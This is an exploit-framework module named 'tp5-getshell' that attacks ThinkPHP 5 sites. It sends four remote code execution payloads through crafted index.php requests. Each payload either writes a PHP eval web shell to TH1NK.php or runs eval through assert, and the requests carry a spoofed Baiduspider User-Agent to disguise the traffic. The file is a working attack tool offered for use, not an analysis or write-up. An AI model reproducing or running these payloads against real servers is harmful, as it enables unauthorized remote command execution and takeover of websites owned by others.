#!/usr/bin/python
# -*- coding:utf8 -*-
from zerooosploit import exploits
from zerooosploit import color
import prettytable as pt
import requests


class Exploit(exploits.ExploitAggregate):

    option = {
        'url': {'default': 'http://your-ip:8080/'}
    }

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'name': 'tp5-getshell',
            'product': 'thinkphp',
            'authors': '',
            'references': '',
            'cve': '',
            'create_date': '2019-06-25'}

    def register_option(self, key, value):
        if key in self.option.keys():
            self.option[key]['default'] = value

    def get_options(self, key):
        return self.option[key]['default']

    def show_options(self):
        tb = pt.PrettyTable()
        field_names = []
        add_row = []
        for v, k in self.option.items():
            field_names.append(v)
            for x in k.values():
                add_row.append(x)
        tb.field_names = field_names
        tb.add_row(add_row)
        print(tb)

    def show_info(self):
        tb = pt.PrettyTable()
        field_names = []
        add_row = []
        for v, k in self.info.items():
            field_names.append(v)
            add_row.append(k)
        tb.field_names = field_names
        tb.add_row(add_row)
        print(tb)

    def run(self):
        url = self.get_options('url')
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.htmlï¼‰'}
        payload = '/index.php/?s=index/\\think\\template\driver\\file/write&cacheFile=TH1NK.php&content=<?php @eval($_POST[1]);?>'
        payload1 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=TH1NK.php&vars[1][]=<?php @eval($_POST[1]);?>'
        payload2 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo \'<?php @eval($_POST[1]);?>\'>TH1NK.php'
        payload3 = ' /index.php/?s=index/\\think\\app/invokefunction&function=assert&vars[0]=eval($_POST[1])&vars[1][]=1'

        explist = [payload, payload1, payload2, payload3]
        for i in range(len(explist)):
            vul_url = url + explist[i]
            try:
                r = requests.get(url=vul_url, headers=headers, timeout=60, verify=False)
            except requests.exceptions.Timeout:
                print(color.fail_tips(url, 'Error: Timeout'))
                continue
            except requests.exceptions.ConnectionError:
                print(color.fail_tips(url, 'Error: ConnectionError'))
                continue
            print(color.process_tips(url, r.status_code))
            if r.status_code == 200:
                print(color.success_tips(url, vul_url))
                break
            else:
                print(color.fail_tips(url, r.status_code))


def main():
    exploit = Exploit()
    exploit.run()
